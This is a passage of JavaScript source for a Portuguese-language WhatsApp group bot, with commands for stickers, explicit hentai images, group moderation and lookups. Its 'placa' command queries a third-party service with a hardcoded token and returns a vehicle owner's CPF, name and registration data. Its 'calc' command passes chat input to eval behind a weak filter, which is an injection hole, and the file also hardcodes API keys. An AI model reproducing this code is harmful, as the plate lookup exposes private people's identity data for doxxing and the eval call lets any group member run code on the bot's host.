conn.sendMessage(from, { sticker: popopoc })
conn.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `By: ${NomeDoBot}`, buttons: [{buttonId: `${prefix}fig-meme`, buttonText: {displayText: '✰ۜۜ͜͡𝐌𝐀𝐈𝐒-𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒🧧'}, type: 1}]}, {quoted: selo})
break

case 'figudesenho':
case 'fig-desenho':
case 'fig-desenhos':
const desenhoa = `${Math.floor(Math.random() * 102)}`
const desenhoe = `${Math.floor(Math.random() * 102)}`
const desenhoi = `${Math.floor(Math.random() * 102)}`
const desenhoo = `${Math.floor(Math.random() * 102)}`
 popopoc = fs.readFileSync(`./figurinhas/figurinha-desenho/${desenhoa}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-desenho/${desenhoe}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-desenho/${desenhoi}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-desenho/${desenhoo}.webp`)
conn.sendMessage(from, { sticker: popopoc })
conn.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `By: ${NomeDoBot}`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐌𝐀𝐈𝐒-𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒🧧'}, type: 1}]}, {quoted: selo})
break


case 'fig-emoji':
const emojii = `${Math.floor(Math.random() * 40)}`
const eemoji = `${Math.floor(Math.random() * 40)}`
const emojis = `${Math.floor(Math.random() * 40)}`
const emojiu = `${Math.floor(Math.random() * 102)}`
 popopoc = fs.readFileSync(`./figurinhas/figurinha-emoji/${emojii}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-emoji/${eemoji}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-emoji/${emojis}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-emoji/${emojiu}.webp`)
conn.sendMessage(from, { sticker: popopoc })
conn.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `By: ${NomeDoBot}`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐌𝐀𝐈𝐒-𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒🧧'}, type: 1}]}, {quoted: selo})
break

case 'figuanime':
case 'fig-anime':
case 'fig-animes':
const annime = `${Math.floor(Math.random() * 77)}`
const annnime = `${Math.floor(Math.random() * 77)}`
const annnnime = `${Math.floor(Math.random() * 77)}`
const nnnannime = `${Math.floor(Math.random() * 77)}`
 popopoc = fs.readFileSync(`./figurinhas/figurinha-anime/${annime}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-anime/${annnime}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-anime/${annnnime}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-anime/${nnnannime}.webp`)
conn.sendMessage(from, { sticker: popopoc })
conn.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `By: ${NomeDoBot}`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐌𝐀𝐈𝐒-𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒🧧'}, type: 1}]}, {quoted: selo})
break

case 'figuraiva':
case 'fig-raiva':
case 'figraiva':
const raivaa = `${Math.floor(Math.random() * 29)}`
const raivae = `${Math.floor(Math.random() * 29)}`
const raivai = `${Math.floor(Math.random() * 29)}`
const raivao = `${Math.floor(Math.random() * 29)}`
 popopoc = fs.readFileSync(`./figurinhas/figurinha-raiva/${raivaa}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-raiva/${raivae}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-raiva/${raivai}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-raiva/${raivao}.webp`)
conn.sendMessage(from, { sticker: popopoc })
conn.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `By: ${NomeDoBot}`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐌𝐀𝐈𝐒-𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒🧧'}, type: 1}]}, {quoted: selo})
break

case 'figubb':
case 'fig-coreana':
const bba = `${Math.floor(Math.random() * 21)}`
const bbe = `${Math.floor(Math.random() * 21)}`
const bbi = `${Math.floor(Math.random() * 21)}`
const bbo = `${Math.floor(Math.random() * 21)}`
popopoc = fs.readFileSync(`./figurinhas/figurinha-coreana/${bba}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-coreana/${bbe}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-coreana/${bbi}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-coreana/${bbo}.webp`)
conn.sendMessage(from, { sticker: popopoc })
conn.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `By: ${NomeDoBot}`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐌𝐀𝐈𝐒-𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒🧧'}, type: 1}]}, {quoted: selo}) 
break

case 'figuengracado':
case 'fig-engracada':
case 'fig-engraçada':
const engraa = `${Math.floor(Math.random() * 25)}`
const engrae = `${Math.floor(Math.random() * 25)}`
const engrai = `${Math.floor(Math.random() * 25)}`
const engrao = `${Math.floor(Math.random() * 25)}`
 popopoc = fs.readFileSync(`./figurinhas/figurinha-engracadas/${engraa}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-engracadas/${engrae}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-engracadas/${engrai}.webp`)
conn.sendMessage(from, { sticker: popopoc })
popopoc = fs.readFileSync(`./figurinhas/figurinha-engracadas/${engrao}.webp`)
conn.sendMessage(from, { sticker: popopoc })
conn.sendMessage(from, {text: 'Olá, você deseja mais *figurinhas*? Clique na opção abaixo e aguarde um pouco.', footer: `By: ${NomeDoBot}`, buttons: [{buttonId: `${prefix + command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐌𝐀𝐈𝐒-𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒🧧'}, type: 1}]}, {quoted: selo})
break
case 'masturbation': // by @ieubielziinn
case 'jahy': // by @ieubielziinn
case 'glasses': // by @ieubielziinn
case 'gangbang': // by @ieubielziinn
case 'foot': // by @ieubielziinn
case 'femdom': // by @ieubielziinn
case 'cum': // by @ieubielziinn
case 'ero': // by @ieubielziinn
case 'cuckold': // by @ieubielziinn
case 'blowjob': // by @ieubielziinn
case 'bdsm': // by @ieubielziinn
case 'ahegao': // by @ieubielziinn
case 'ass': // by @ieubielziinn
case 'orgy': // by @ieubielziinn
case 'panties': // by @ieubielziinn
case 'thinghs': // by @ieubielziinn
case 'tentacles': // by @ieubielziinn
case 'pussy': // by @ieubielziinn
case 'sfwneko': // by @ieubielziinn
case 'zettairyouiki': // by @ieubielziinn
reply(enviar.espere)
if (isGroup) reply(`O hentai foi enviado no pv do usuário, verifique!`)
aa = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎𝐗𝐈𝐌𝐎-𝐇𝐄𝐍𝐓𝐀𝐈🔞'}, type: 1}]
buttonMessagse = {
image: {url: `https://apis.nezsab-apis.xyz/nsfw/${command}?apikey=apikey_LuixxLindo-2023`},
caption: `▢ ⌁ *Olá ${pushname}*, aqui está o seu pedido!\n▢ ⌁ *Horário solicitado:* ${time}\n▢ ⌁ Deseja mais hentai _*${command}*_? Clique no botão abaixo:`,
footer: `By: ${NomeDoBot}`,
buttons: aa,
headerType: 4
}
sendMsg = conn.sendMessage(sender, buttonMessagse, {quoted: info})
break

case 'nsfwneko': // by @ieubielziinn
reply(enviar.espere)
if (isGroup) reply(`O hentai foi enviado no pv do usuário, verifique!`)
aa = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎𝐗𝐈𝐌𝐎-𝐇𝐄𝐍𝐓𝐀𝐈🔞'}, type: 1}]
buttonMessagse = {
image: {url: `https://apis.nezsab-apis.xyz/nsfw/neko?apikey=apikey_LuixxLindo-2023`},
caption: `▢ ⌁ *Olá ${pushname}*, aqui está o seu pedido!\n▢ ⌁ *Horário solicitado:* ${time}\n▢ ⌁ Deseja mais hentai _*${command}*_? Clique no botão abaixo:`,
footer: `By: ${NomeDoBot}`,
buttons: aa,
headerType: 4
}
sendMsg = conn.sendMessage(sender, buttonMessagse, {quoted: info})
break

case 'yuri': // by @ieubielziinn
reply(enviar.espere)
if (isGroup) reply(`O hentai foi enviado no pv do usuário, verifique!`)
aa = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎𝐗𝐈𝐌𝐎-𝐇𝐄𝐍𝐓𝐀𝐈🔞'}, type: 1}]
buttonMessagse = {
image: {url: `https://apis.nezsab-apis.xyz/nsfw/${command}?apikey=apikey_LuixxLindo-2023`},
caption: `▢ ⌁ *Olá ${pushname}*, aqui está o seu pedido!\n▢ ⌁ *Horário solicitado:* ${time}\n\nDeseja mais hentai de *${command}*? _Clique no botão abaixo e aguarde!_`,
footer: `By: ${NomeDoBot}`,
buttons: aa,
headerType: 4
}
sendMsg = conn.sendMessage(sender, buttonMessagse, {quoted: info})
break
case 'placa':
if(!isPremium) return reply(enviar.msg.premium)  
if (args.length == 0) return reply(`Exemplo: ${prefix + command} 54330235`)
query = args.join(" ")
get_result = await fetchJson(`http://api.ifindconsultas.tk/?token=2d6de38e-6c92-485e-bacb-db64139f8a02&placa=${query}`)
x = get_result
k = `CPF : ${x.cpf}
NOME: ${x.nome}
PLACA : ${x.placa}
CHASSI : ${x.chassi}
RENAVAM : ${x.renavam}
CIDADE : ${x.cidade}
UF : ${x.uf}
CATEGORIA : ${x.categoria}
COMBUSTÍVEL : ${x.combustivel}`
reply(k)
break 

case 'ddd':
if(!isPremium) return reply(enviar.msg.premium)
if (args.length < 1) return reply(`Use ${prefix + command} 81`)
ddd = body.slice(5)
ddds = await axios.get(`https://brasilapi.com.br/api/ddd/v1/${ddd}`)
dddlist = `Lista de Cidades de ${ddds.data.state} com este DDD ${q}>\n\n`
for (let i = 0; i < ddds.data.cities.length; i++) { dddlist += `${i + 1} ⪧ *${ddds.data.cities[i]}*\n` }
conn.sendMessage(from, {text: dddlist}, {quoted: info})	
break

case 'encurtalink':
if(!isPremium) return reply(enviar.msg.premium)
if(args.length < 1) return reply(`Exemplo:\n${prefix}encurtalink https://youtube.com/@Luix1397`)
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
await limitAdd(sender)
break

//===========(ADMS-FUNÇÕES-AKI)=========\\

case 'repetir':
rsp = q.replace(new RegExp("[()+-/ +a/b/c/d/e/fghijklmnopqrstwuvxyz/]", "gi"), "")
reply(rsp)
break

case 'calculadora':
case 'calcular':  
case 'calc':
rsp = q.replace("x", "*").replace('"', ":").replace(new RegExp("[()abcdefghijklmnopqrstwuvxyz]", "gi"), "").replace("÷", "/")
console.log('[', color('EVAL', 'silver'),']', color(moment(info.messageTimestamp * 1000).format('DD/MM HH:mm:ss'), 'yellow'), color(rsp))
return reply(JSON.stringify(eval(`${rsp}`,null,'\t')))
break 

case 'status':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins && !SoDono && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.adm)
statuszada =
`╭╼╼╾❲ S T A T U S ❳╼╼╾╮
│
│➱ Antiaudio: ${isAntiAudio? '✓' : '✕'}
│➱ Antidocumento: ${Antidoc ? '✓' : '✕'}
│➱ Antifake: ${isAntifake ? '✓' : '✕'}
│➱ Antiimg: ${isAntiImg? '✓' : '✕'}
│➱ AntiContato ${isAntiCtt ? '✓' : '✕'}
│➱ AntiSticker: ${isAntiSticker ? '✓' : '✕'}
│➱ Antiligação: ${isAnticall ? '✓' : '✕'}
│➱ AntiPv-Block: ${isAntiPv ? '✓' : '✕'}
│➱ AntilinkHard: ${isAntiLinkHard ? '✓' : '✕'}
│➱ LimiteCaracteres: ${isAntiFlood ? '✓' : '✕'}
│➱ AntiCatalogo: ${isAnticatalogo ? '✓' : '✕'}
│➱ AntiPalavrão: ${isPalavrao ? '✓' : '✕'}
│➱ Antivideo: ${isAntiVid ? '✓' : '✕'}
│➱ AntiLocalização: ${Antiloc ? '✓' : '✕'}
│➱ Bemvindo: ${isWelkom ? '✓' : '✕'}
│➱ Simih: ${isSimi ? '✓' : '✕'}
│➱ Modo brincadeira: ${isModobn ? '✓' : '✕'}
│
╰╼╾❲ ${NomeDoBot} ❳╼╾╯️`
conn.sendMessage(from, {image: {url: logo}, caption: statuszada, thumbnail: null})
break

case 'nomegp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
blat = args.join(" ")
conn.groupUpdateSubject(from, `${blat}`)
conn.sendMessage(from, {text: 'Sucesso, alterou o nome do grupo'}, {quoted: info})
break

case 'descgp':
case 'descriçãogp':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.adm)
blabla = args.join(" ")
conn.groupUpdateDescription(from, `${blabla}`)
conn.sendMessage(from, {text: 'Sucesso, alterou a descrição do grupo'}, {quoted: info})
break

case 'setfotogp':
case 'fotogp':  
addFilter(from)
if (!isGroup) return reply('Só pode ser utilizado em Grupo')
if (!isGroupAdmins) return reply('Você precisa ser ADM')
if (!isBotGroupAdmins) return reply('O bot Precisa ser ADM')
if (!isQuotedImage) return reply(`Use: ${prefix + command} <Marque uma foto>`)
ftgp = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(ftgp.mimetype))
buffimg = await getFileBuffer(ftgp, 'image')
fs.writeFileSync(rane, buffimg)
medipp = rane 
await conn.updateProfilePicture(from, {url: medipp})
reply(`Foto do grupo alterada com sucesso`) 
break

case 'teste3':
case 'atividades':  
try{
if(!isGroupAdmins && !issupre && !ischyt) return reply(enviar.msg.adm)
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
teks = `*Atividade dos membros do grupo:*\n\n`
mem = []
for(let obj of groupMembers) {
if(numbersIds.indexOf(obj.id) >=0) {
var indnum = numbersIds.indexOf(obj.id)
teks += `*• Membro:* @${countMessage[ind].numbers[indnum].id.split('@')[0]}\n*• Comandos:* ${countMessage[ind].numbers[indnum].cmd_messages}\n*• Mensagens:* ${countMessage[ind].numbers[indnum].messages}\n\n----------------------------------\n\n`
} else {
teks += `*• Membro:* @${obj.id.split('@')[0]}\n*• Comandos:* 0\n*• Mensagens:* 0\n\n----------------------------------\n\n`
}
mem.push(obj.id)
}
conn.sendMessage(from, {text: teks, mentions: [mem]}, {quoted: info})
} else return reply('*Nada foi encontrado*')
} catch (e){
console.log(e)
}
break

case 'linkgp':
case 'linkgroup':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isGroup) return reply(enviar.msg.grupo)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
linkgc = await conn.groupInviteCode(from)
reply('https://chat.whatsapp.com/'+linkgc)
break

case 'grupo': 
if (!isGroup) return reply(`SÓ EM GRUPO`)
if (!isGroupAdmins) return reply(`PRECISA SER ADMININASTROR`)
if (!isBotGroupAdmins) return reply(`BOT PREPRECISA SER ADMININASTROR`)
if (args[0] === 'a') {
reply(`*GRUPO ABERTO COM SUCESSO*`)
await conn.groupSettingUpdate(from, 'not_announcement')
} else if (args[0] === 'f') {
reply(`*GRUPO FECHADO COM SUCESSO*`)
await conn.groupSettingUpdate(from, 'announcement')
}				 
break 

case 'infogrupo':
case 'testegrupo':  
case 'gpinfo':  
case 'regras':  
if (!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins)return reply(enviar.msg.adm)
ppUrl = await conn.profilePictureUrl(from, 'image')
const metadata = await conn.groupMetadata(from) 
conn.sendMessage(from, {image: {url: ppUrl}, caption: `*NOME* : ${groupName}\n*MEMBRO* : ${groupMembers.length}\n*ADMIN* : ${groupAdmins.length}\n*DESCRIÇÃO* : ${metadata.desc}`, thumbnail: null}, {quoted: info})
break 

case 'totag':
case 'cita':
case 'hidetag':
if(!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if(!isGroupAdmins) return reply('Você precisa ser ADM pra utilizar este comando')
if(q.includes(`${prefix}`)) return reply("Não pode utilizar comandos nesse comando")
if(q.includes("=>") || q.includes(">")) return
membros = (groupId, membros1) => {
array = []
for (let i = 0; i < membros1.length; i++) {
array.push(membros1[i].id)
}
return array
}
var yd = membros(from, groupMembers)
if((isMedia && !info.message.videoMessage || isQuotedSticker) && args.length == 0) {
media = isQuotedSticker ? info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage : info.message.stickerMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'sticker')
fs.writeFileSync(rane,img)
fig = fs.readFileSync(rane)
var options = {
sticker: fig,  
mentions: yd
}
conn.sendMessage(from, options)
} else if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) {
media = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'image')
fs.writeFileSync(rane,img)
buff = fs.readFileSync(rane)
conn.sendMessage(from, {image: buff, mentions: yd}, {quoted: info})
} else if ((isMedia && !info.message.videoMessage || isQuotedVideo) && args.length == 0) {
media = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(media.mimetype))
vid = await getFileBuffer(media, 'video')
fs.writeFileSync(rane,vid)
buff = fs.readFileSync(rane)
conn.sendMessage(from, {video: buff, mimetype: 'video/mp4',mentions: yd}, {quoted: info})
} else if ((isMedia && !info.message.videoMessage || isQuotedAudio) && args.length == 0) {
media = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(media.mimetype))
aud = await getFileBuffer(media, 'audio')
fs.writeFileSync(rane,aud)
buff = fs.readFileSync(rane)
conn.sendMessage(from, {audio: buff, mimetype: 'audio/mp4', ptt:true,mentions: yd}, {quoted: info})
} else if ((isMedia && !info.message.videoMessage || isQuotedDocument) && args.length == 0) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(rane,doc)
buff = fs.readFileSync(rane)
conn.sendMessage(from, {document: buff, mimetype : 'text/plain',mentions: yd},{quoted: info})
} else if(budy){
if(q.length < 1) return reply('Citar oq?')
conn.sendMessage(from, {text: body.slice(command.length + 2), mentions: yd})
} else {
reply(`Responder imagem/documento/gif/adesivo/áudio/vídeo com legenda ${prefix + command}`)
}
break

case 'marcar':
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/marcar.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
}
try {
if (!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if (!isGroupAdmins) return reply('Você precisa ser ADM pra utilizar este comando')
if(q.includes(`${prefix}`)) return reply("Não pode utilizar comandos nesse comando")
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `*#* @${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
mentions(teks, members_id, true)
} catch {
reply('ERROR!!')
}
break

case 'marcar2':
try {
if (!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if (!isGroupAdmins) return reply('Você precisa ser ADM pra utilizar este comando')  
if(q.includes(`${prefix}`)) return reply("Não pode utilizar comandos nesse comando")
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `╠➥ @${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
reply(teks)
} catch {
reply('ERROR!!')
}
break

case 'marcarwa':
try {
if (!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if (!isGroupAdmins) return reply('Você precisa ser ADM pra utilizar este comando')  
if(q.includes(`${prefix}`)) return reply("Não pode utilizar comandos nesse comando")
members_id = []
teks = (args.length > 1) ? body.slice(10).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `╠➥ https://wa.me/${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
conn.sendMessage(from, {text: teks}, {quoted: info})
} catch {
reply('ERROR!!')
}
break

case 'reviverqr':
if(!SoDono && !isnit) return 
exec("cd ALEATORY-QR* && rm -rf pre-key* sender* session*")
setTimeout(async () => {
reply("Reiniciando..")
setTimeout(async () => {
startAle()
}, 1200)
}, 1000)
break
case 'reviver':
case 'add3':
if (!isGroup) return reply('Esse comando so funciona em grupo, sinto muito')
if(!SoDono) return reply("Comando Desativado pelo dono...")
if(!isGroupAdmins) return reply('❌ VOCÊ NÃO É ADM PRA UTILIZAR ESTE COMANDO, DESCULPE, QUEM SABE UM DIA 😂')
if(!isBotGroupAdmins) return reply("Não sou adm pra executar esta ação..")
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque uma mensagem do alvo!')
sleep(5000)
response2 = await conn.groupParticipantsUpdate(from, [menc_prt], "add" )
reply('Usuario Adicionado de volta ao grupo.')
break

case 'add':
if(!isGroupAdmins) return reply('❌ VOCÊ NÃO É ADM PRA UTILIZAR ESTE COMANDO, DESCULPE, QUEM SABE UM DIA 😂')  
if(!SoDono) return reply('Comando Desativado por questões de segurança, estava ocasionandoo Ban do número do bot.')
if(!isBotGroupAdmins) return reply("Não sou adm pra executar esta ação..")
if(q.length < 1) return reply('Quer adicionar uma alma?')  
try {
tdt = args[0]
if(tdt.length < 1) return reply(`Digita o número que deseja add, exemplo: ${prefix}add 558198923680`)
if (info.message.extendedTextMessage === null || info.message.extendedTextMessage === undefined) {
adduser = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(groupMetadata.participants.includes(adduser)) return reply('Esse membro já está no grupo, como você vai adicionar??? ')
reply('Irei adicionar ele(a) em 5 segundos...')  
setTimeout(async() => {
responser = await conn.groupParticipantsUpdate(from, [adduser], "add")
}, 5000)
o = responser.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('O alvo já está no grupo!')
if(inv[0].code == 403) return reply('Erro, conta privada do usuário')
if(inv[0].code == 408) return reply('Erro, usuário acabou de sair')
if(inv[0].code == 401) return reply('Erro, porque o bot está bloqueado pelo alvo ')
} else {
if(groupMetadata.participants.includes(adduser)) return reply('Esse membro já está no grupo, como você vai adicionar??? ')  
reply('Irei adicionar ele(a) em 5 segundos...')  
setTimeout(async() => {
responser =  await conn.groupParticipantsUpdate(from, [menc_prt], "add")
}, 5000)
o = responser.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('O alvo já está no grupo! ')
if(inv[0].code == 403) return reply('Falhou, porque em privado ')
if(inv[0].code == 408) return reply('Falha, porque o alvo acabou de sair ')
if(inv[0].code == 401) return reply('Falha, porque o bot está bloqueado pelo alvo ')
}
} catch (e){
if(!q.includes("@")) {
var addusr = menc_prt
} else {
var addusr = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` 
}
if(String(e).includes("responser is not defined")) {
linkgc = await conn.groupInviteCode(from)  
conn.sendMessage(addusr, {text: `Você está com o número privado para adicionar em grupos, então está ae o link do grupo : https://chat.whatsapp.com/${linkgc}`})
} else {
reply('Izi, se não for adicionado provavelmente ele privou só para contatos adicionar ele em grupo.')
}
}
break
case 'add2': {
		if (!isGroupAdmins) throw (`${ot}`)
                if (!isBotGroupAdmins) throw (mess.only.botadm)
                if (!SoDono) throw (mess.only.gcadmin)
		let users = quoted ? quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await conn.groupParticipantsUpdate(chat, [users], 'add').then((res) => console.log(jsonformat(res))).catch((err) => console.log(jsonformat(err)))
	}
break
case 'sairgp':
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/tchauzinho.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
}
if(isGroup && !SoDono && !info.key.fromMe) return reply("Este comando só o bot ou o dono pode executar..")
try {
conn.groupLeave(from)
} catch(erro) {
reply(String(erro))
}
break

case 'seradm':
if(!SoDono && !isnit) return reply("Só dono pode executar este comando.")
mentions(`@${sender.split("@")[0]} Pronto - Agora você é um administrador..`, [sender], true)
conn.groupParticipantsUpdate(from, [sender], "promote")
break

case 'sermembro':
if(!SoDono && !isnit) return reply("Só dono pode executar este comando.")
mentions(`@${sender.split("@")[0]} Pronto - Agora você é um membro comum novamente..`, [sender], true)
conn.groupParticipantsUpdate(from, [sender], "demote")
break
case 'advertir':
case 'adverter':
if (!isGroup) return reply("Somente em grupos.")
if (!isGroupAdmins) return reply("Somente adm pode utilizar esse comando.")
if (!isBotGroupAdmins) return reply("Bot precisa ser adm para executar.")
if(!(type == 'extendedTextMessage'))return reply('Marque a msg do usuario para dar uma advertencia')
advertir = info.message.extendedTextMessage.contextInfo.participant
if (getAdvertencia(advertir, from) == undefined)addAdvertirId(advertir, from)
addAdvertir(advertir, from, 1)
if(getAdvertencia(advertir, from) == 1){
mentions(`Olá @${advertir.split("@")[0]} vc levou uma advertência, por desrespeito as regras do grupo`,[advertir])
}else if(getAdvertencia(advertir, from) == 2){
mentions(`Cuidado @${advertir.split("@")[0]} vc já tem ${getAdvertencia(advertir, from)} advertencias, se você receber +1 será removida(o) do grupo`, [advertir])
}else if(getAdvertencia(advertir, from) == 3){
mentions(`Querido(a) @${advertir.split("@")[0]} vejo q vc já levou ${getAdvertencia(advertir, from)} advertencias por isto vc será removido do grupo`,[advertir])
conn.groupParticipantsUpdate(from, [advertir], 'remove')
addAdvertir(advertir, from, -3)
}
break
case 'bann':
if (!isPremium && !SoDono) return reply("Só usuário premium pode utilizar este comando..") 
if(!isBotGroupAdmins) return reply("Não sou adm pra executar esta ação..")
if(!budy.includes("@")) {
if (info.message.extendedTextMessage == undefined || info.message.extendedTextMessage == null) return reply(`Marque a mensagem do usuário que deseja remover ele ou marque com ${prefix}ban @marcar-ele`)
if(!JSON.stringify(groupMembers).includes(menc_prt)) return reply("Este usuário já foi removido do grupo.")
if(premium.includes(menc_prt)) return mentions(`@${menc_prt.split("@")[0]} a(o) @${sender.split("@")[0]} está querendo banir você, visualiza esse problema ae 😶`, [menc_prt], true)
if(groupAdmins.includes(menc_prt)) return mentions(`@${mentioned.split("@")[0]} a(o) @${sender.split("@")[0]} está querendo banir você, visualiza esse problema ae 😶`, [menc_prt], true)
if(botNumber.includes(menc_prt)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodono.includes(menc_prt)) return reply('Não posso remover meu dono 🤧')
conn.sendMessage(from, {text: `@${menc_prt.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos ainda não esclarecidos) -`, mentions: [menc_prt]})
conn.groupParticipantsUpdate(from, [menc_prt], "remove")  
} else {
if(q.length > 15) return reply('Só pode remover uma pessoa por vez..')
if(!JSON.stringify(groupMembers).includes(menc_jid)) return reply("Este usuário já foi removido do grupo.")
if(botNumber.includes(menc_jid)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodono.includes(menc_jid)) return reply('Não posso remover meu dono 🤧')
if(premium.includes(menc_jid)) return mentions(`@${mentioned.split("@")[0]} a(o) @${sender.split("@")[0]} está querendo banir você, visualiza esse problema ae 😶`, [mentioned], true)
if(groupAdmins.includes(menc_jid)) return mentions(`@${mentioned.split("@")[0]} a(o) @${sender.split("@")[0]} está querendo banir você, visualiza esse problema ae 😶`, [mentioned], true)
conn.sendMessage(from, {text: `@${menc_jid.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos ainda não esclarecidos) - `, mentions: [menc_jid]})
